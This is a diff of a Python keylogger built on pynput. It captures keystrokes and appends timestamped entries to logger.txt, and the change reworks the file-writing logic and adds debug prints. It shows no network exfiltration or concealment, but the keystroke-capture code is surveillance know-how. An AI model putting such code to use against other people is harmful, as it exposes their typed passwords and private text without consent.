@@ -2,6 +2,8 @@ from pynput.keyboard import Key, Listener
 import datetime
 pressed_keys = []
 log_dict = {}
+print(len(log_dict))
+
 
 def on_press(key):
     global pressed_keys
@@ -15,6 +17,14 @@ def on_press(key):
     if pressed_keys[-1] == 'Key.space' or pressed_keys[-1] == 'Key.enter' or pressed_keys[-1]=='Key.esc':
         logger(pressed_keys)
         pressed_keys = []
+        
+    if len(log_dict) > 1:
+        print("There are more than one log entries, writing to file and removing the last one.")
+        not_now = list(log_dict.keys())[-2]
+        print(not_now)
+        write_file(not_now)
+        del log_dict[not_now]
+        print(log_dict)
 
 def logger(keys):
     global log_dict
@@ -42,18 +52,13 @@ def logger(keys):
     else:
         log_dict[now] = data_str
         print(log_dict)
-    write_file(log_dict)
+    # write_file(log_dict)
 
 
-def write_file(log_dict):
+def write_file(key):
+    print(log_dict)
     with open('logger.txt', 'a') as f:
-        for key, value in log_dict.items():
-            f.write(key + '\n' + '  ' + value + '\n')
-
-if len(log_dict) > 1:
-    not_now = list(log_dict.keys())[-2]
-    write_file(log_dict[not_now])
-    log_dict.popitem()
+            f.write(key + '\n' + '  ' + log_dict[key] + '\n')
 
 
 def on_release(key):
